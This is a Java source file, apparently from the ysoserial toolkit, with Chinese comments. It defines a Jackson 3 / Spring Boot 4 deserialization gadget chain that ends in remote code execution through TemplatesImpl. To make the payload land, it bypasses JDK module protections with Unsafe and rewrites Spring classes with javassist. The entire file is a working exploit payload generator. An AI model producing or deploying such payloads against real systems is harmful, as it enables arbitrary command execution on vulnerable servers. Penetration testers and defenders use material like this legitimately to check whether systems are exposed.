package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;
import javassist.CtNewConstructor;
import javassist.CtNewMethod;
import javassist.Modifier;
import javassist.NotFoundException;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavassistHelper;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.ObjectStreamClass;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * Jackson 3（tools.jackson）下的 POJONode 链，适配 Spring Boot 4（Spring 7 默认 JSON 库）。
 *
 * 触发链：
 *   hash 碰撞 -> XString.equals(POJONode) -> POJONode.toString -> Jackson getter
 *   -> Proxy(javax.xml.transform.Templates).getOutputProperties
 *   -> JdkDynamicAopProxy.invoke -> TemplatesImpl.getOutputProperties -> newTransformer -> 字节码 RCE
 *
 * 与 {@link JacksonJdk17} 的唯一差异：POJONode 从 com.fasterxml 换成 tools.jackson，
 * writeReplace 需同时清理 jackson2 / jackson3 两版（对应 JimuReport Case01 -> Case05）。
 *
 * 注意：Jackson 3 是 Java 17 class，而本项目按 Java 8 编译，
 * 因此这里用反射加载 tools.jackson.databind.node.POJONode，避免编译期依赖。
 *
 * serialVersionUID 处理：DefaultAdvisorChainFactory 在 Spring 6/7（Spring Boot 3/4）
 * 隐式 suid 变为 273003553246259276，这里无条件用 JavassistHelper 重写对齐目标端。
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
    "tools.jackson.core:jackson-databind:3.x",
    "org.springframework:spring-aop:5.x"
})
@Authors({Authors.Unam4})
public class Jacksonspring4 implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jacksonspring4.class, args);
    }

    public Object getObject(final String command) throws Exception {
        // Spring 7（Spring Boot 4）把 ProxyConfig 的 boolean 字段全部改成了 Boolean 包装类型，
        // 本地编译依赖 Spring 3.2.3（boolean），必须先在序列化前对齐，否则反序列化端报
        // InvalidClassException: incompatible types for field xxx
        patchProxyConfigFields();

        // Spring Boot 4（Spring 7）下 DefaultAdvisorChainFactory 隐式 suid 变为 273003553246259276，
        // 无条件用 javassist 重写对齐目标端
        patchDefaultAdvisorChainFactoryUid();

        removeWriteReplace();

        // Templates 代理（JdkDynamicAopProxy，复用 JacksonJdk17 的逻辑）
        Object proxy = JacksonJdk17.makeTemplatesImplAopProxy(command);

        // Jackson 3（tools.jackson）POJONode 包装，反射加载避免 Java 8 编译期依赖
        Object node = createJackson3POJONode(proxy);

        // XStringForChars hash 碰撞触发
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xString = Reflections.createWithoutConstructor(aClass1);
        Reflections.setFieldValue(xString, "m_obj", new char[]{});
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", xString);
        hashMap1.put("yy", node);
        hashMap2.put("yy", xString);
        hashMap2.put("zZ", node);
        return Gadgets.makeMap(hashMap1, hashMap2);
    }

    /** 反射创建 tools.jackson.databind.node.POJONode，避免 Java 8 编译期依赖（Jackson 3 需 Java 17） */
    private static Object createJackson3POJONode(Object value) throws Exception {
        Class<?> cls = Class.forName("tools.jackson.databind.node.POJONode");
        Constructor<?> ctor = cls.getConstructor(Object.class);
        return ctor.newInstance(value);
    }

    /**
     * 清掉 POJONode/BaseJsonNode 的 writeReplace 缓存，让 _value 原样参与序列化
     * （否则 POJONode 会序列化成 NodeSerialization，代理对象丢在 JSON 字符串里）。
     * 同时清理 Jackson 2 与 Jackson 3 两版（失败忽略）。
     */
    private static void removeWriteReplace() throws Exception {
        bypassModule(Jacksonspring4.class);
        for (String cn : new String[]{
            "com.fasterxml.jackson.databind.node.POJONode",
            "com.fasterxml.jackson.databind.node.BaseJsonNode",
            "tools.jackson.databind.node.POJONode",
            "tools.jackson.databind.node.BaseJsonNode",
        }) {
            try {
                Class<?> c = Class.forName(cn);
                ObjectStreamClass osc = ObjectStreamClass.lookup(c);
                // ObjectStreamClass 在 java.base/java.io，writeReplaceMethod 是私有字段，s
                // 必须先绕过 module 让 setAccessible 以 java.base 身份执行。
                Field wr = osc.getClass().getDeclaredField("writeReplaceMethod");
                wr.setAccessible(true);
                wr.set(osc, null);
            } catch (Throwable ignore) {
            }
        }
    }

    /** Unsafe 修改 Class.module 为 java.base，绕过 JDK9+ 强封装（JDK8 下自动忽略） */
    private static void bypassModule(Class<?> target) {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, target, offset, module);
        } catch (Exception ignored) {
        }
    }

    /**
     * Spring 7（Spring Boot 4）把 ProxyConfig 的 5 个字段从基本类型 boolean 改成了包装类型 Boolean：
     *   proxyTargetClass / optimize / opaque / exposeProxy / frozen
     * 本地编译依赖 Spring 3.2.3（boolean），序列化后字段类型为基本类型，反序列化端 Spring 7 期望 Boolean，
     * 两者字段类型不一致会抛 InvalidClassException: incompatible types for field xxx。
     *
     * 这里在序列化前用 javassist 把本地 ProxyConfig 的字段类型改成 Boolean，并重写构造器/getter/setter，
     * 保证序列化流的字段描述符与目标端一致。必须放在 AdvisedSupport（JdkDynamicAopProxy 的载体）加载之前执行。
     */
    private void patchProxyConfigFields() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get("org.springframework.aop.framework.ProxyConfig");
        if (cc.isFrozen()) {
            cc.defrost();
        }

        // 1) 字段：boolean -> Boolean（访问修饰符保持原样，序列化匹配只关心字段名+类型）
        CtClass booleanType = pool.get("java.lang.Boolean");
        String[] privateFields = {"proxyTargetClass", "optimize", "frozen"};
        String[] packageFields = {"opaque", "exposeProxy"};

        for (String name : privateFields) {
            removeFieldIfExists(cc, name);
            CtField f = new CtField(booleanType, name, cc);
            f.setModifiers(Modifier.PRIVATE);
            cc.addField(f);
        }
        for (String name : packageFields) {
            removeFieldIfExists(cc, name);
            cc.addField(new CtField(booleanType, name, cc));
        }

        // 2) 重写无参构造器（Boolean 字段默认 null，目标端 readObject 可接受）
        CtConstructor ctor = cc.getDeclaredConstructor(new CtClass[0]);
        cc.removeConstructor(ctor);
        cc.addConstructor(CtNewConstructor.make("public ProxyConfig() {}", cc));

        // 3) 移除并重写 getter/setter/copyFrom/toString，避免旧方法体字段描述符(Z)与 Boolean 字段不匹配
        String[] methodNames = {
            "setProxyTargetClass", "isProxyTargetClass",
            "setOptimize", "isOptimize",
            "setOpaque", "isOpaque",
            "setExposeProxy", "isExposeProxy",
            "setFrozen", "isFrozen",
            "copyFrom", "toString"
        };
        for (String name : methodNames) {
            try {
                cc.removeMethod(cc.getDeclaredMethod(name));
            } catch (NotFoundException ignore) {
            }
        }

        cc.addMethod(CtNewMethod.make("public void setProxyTargetClass(boolean v) { this.proxyTargetClass = Boolean.valueOf(v); }", cc));
        cc.addMethod(CtNewMethod.make("public boolean isProxyTargetClass() { return Boolean.TRUE.equals(this.proxyTargetClass); }", cc));
        cc.addMethod(CtNewMethod.make("public void setOptimize(boolean v) { this.optimize = Boolean.valueOf(v); }", cc));
        cc.addMethod(CtNewMethod.make("public boolean isOptimize() { return Boolean.TRUE.equals(this.optimize); }", cc));
        cc.addMethod(CtNewMethod.make("public void setOpaque(boolean v) { this.opaque = Boolean.valueOf(v); }", cc));
        cc.addMethod(CtNewMethod.make("public boolean isOpaque() { return Boolean.TRUE.equals(this.opaque); }", cc));
        cc.addMethod(CtNewMethod.make("public void setExposeProxy(boolean v) { this.exposeProxy = Boolean.valueOf(v); }", cc));
        cc.addMethod(CtNewMethod.make("public boolean isExposeProxy() { return Boolean.TRUE.equals(this.exposeProxy); }", cc));
        cc.addMethod(CtNewMethod.make("public void setFrozen(boolean v) { this.frozen = Boolean.valueOf(v); }", cc));
        cc.addMethod(CtNewMethod.make("public boolean isFrozen() { return Boolean.TRUE.equals(this.frozen); }", cc));
        cc.addMethod(CtNewMethod.make(
            "public void copyFrom(org.springframework.aop.framework.ProxyConfig other) { " +
            "this.proxyTargetClass = other.proxyTargetClass; " +
            "this.optimize = other.optimize; " +
            "this.exposeProxy = other.exposeProxy; " +
            "this.frozen = other.frozen; " +
            "this.opaque = other.opaque; }", cc));
        cc.addMethod(CtNewMethod.make("public String toString() { return \"ProxyConfig\"; }", cc));

        // 4) 用当前类加载器重新加载（必须在 AdvisedSupport 加载前完成）
        cc.toClass();
    }

    private static void removeFieldIfExists(CtClass cc, String name) {
        try {
            cc.removeField(cc.getDeclaredField(name));
        } catch (NotFoundException ignore) {
        }
    }

    /** 用 javassist 重写 DefaultAdvisorChainFactory 的 serialVersionUID（Spring 6/7 隐式值 273003553246259276） */
    private void patchDefaultAdvisorChainFactoryUid() throws Exception {
        JavassistHelper helper = new JavassistHelper("org.springframework.aop.framework.DefaultAdvisorChainFactory");
        helper.setSerialVersionUID("273003553246259276");
        CtClass ctClass = JavassistHelper.getCtClass();
        ctClass.toClass();
        ctClass.defrost();
    }
}
